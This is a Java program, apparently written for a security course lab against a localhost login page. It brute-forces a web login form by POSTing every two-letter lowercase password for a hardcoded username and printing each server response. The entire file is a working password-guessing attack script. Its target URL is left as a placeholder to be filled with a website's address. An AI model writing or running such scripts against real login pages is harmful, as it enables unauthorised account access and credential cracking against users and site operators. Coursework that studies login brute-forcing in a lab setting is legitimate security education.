import java.io.*;
import java.net.*;
import java.util.*;
// ref: https://stackoverflow.com/questions/4205980/java-sending-http-parameters-via-post-method-easily
class SubmitPostForm {
    public static void main(String[] args) throws Exception {
        long startTime = System.nanoTime();
        char[] allowed = new char[]{
            'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
            'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',};
        // The page containing the form on my localhost is:
        // http://localhost/cs5352pwd/loginScreen.php
        // Looking at "view page source", we see that the form has:
        //   action="loginScreen.php"
        //   name="un"
        //   name="pw"
        // So, the form page is the same as the action.
        // If they were different, we would use the action for url.
        //URL url = new URL("http://localhost/cs5352pwd/loginScreen.php");
        URL url = new URL("loginScreen.php"); // put url of website
        String combo = "";
        for (int i = 0; i < allowed.length; i++) {
            for (int k = 0; k < allowed.length; k++) {
                combo = String.valueOf(allowed[i]) + String.valueOf(allowed[k]);
                sendRequest(url, "jonathan53_-uLQ", combo);
                Thread.sleep(1000);
            }
        }
        long endTime = System.nanoTime();
        System.out.println("Time taken: " + (endTime - startTime));
        
    }
    private static void sendRequest(URL url, String username, String password) throws Exception {
        Map<String, Object> params = new LinkedHashMap<>();
        params.put("un", username);
        params.put("pw", password);

        StringBuilder postData = new StringBuilder();
        for (Map.Entry<String,Object> param : params.entrySet()) {
            if (postData.length() != 0) postData.append('&');
            postData.append(URLEncoder.encode(param.getKey(), "UTF-8"));
            postData.append('=');
            postData.append(URLEncoder.encode(String.valueOf(param.getValue()), "UTF-8"));
        }
        byte[] postDataBytes = postData.toString().getBytes("UTF-8");

        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        conn.setRequestProperty("Content-Length", String.valueOf(postDataBytes.length));
        conn.setDoOutput(true);
        conn.getOutputStream().write(postDataBytes);

        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
        String cracked = in.readLine() + in.readLine();
        System.out.println(password+" "+cracked);
    }
}